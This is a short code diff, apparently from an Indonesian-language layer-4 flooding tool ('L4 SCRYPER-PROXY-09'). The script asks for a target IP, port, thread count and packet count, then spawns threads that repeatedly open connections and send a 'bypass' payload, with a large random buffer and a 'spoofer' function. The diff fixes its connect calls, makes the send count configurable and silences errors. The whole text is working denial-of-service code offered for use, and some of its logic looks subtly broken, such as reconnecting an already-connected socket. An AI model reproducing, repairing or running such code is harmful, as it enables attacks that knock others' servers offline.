@@ -103,6 +103,7 @@ print("Dont Leak L4 SCRYPER-PROXY-09|2023|")
 ip = str(input("Ip Sërvër =:"))
 port = int(input("Pōrt/t =:"))
 th = int(input("Thrëâd/t =:"))
+pack = int(input("Pack/s =:"))
 
 byte5 = random._urandom(45551)
 def spoofer():
@@ -163,16 +164,16 @@ def Flood():
   while True:
         try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-           s.connect(str(ip),int(port))
+           s.connect((str(ip),int(port)))
            s.send(str.encode(bypass))
            s.send(str.encode(bypass))
-           for i in range(10000):
-               s.connect(str(ip),int(port))
+           for i in range(pack):
+               s.connect((str(ip),int(port)))
                s.send(str.encode(bypass))
                s.send(str.encode(bypass))
-               print("Sukses MengirimKan Sebuah Virus☕")
+               print("Sukses MengirimKan Sebuah Virus")
         except:
-           s.close()
+               pass
 
 for x in range(th):
   th = threading.Thread(target=Flood)
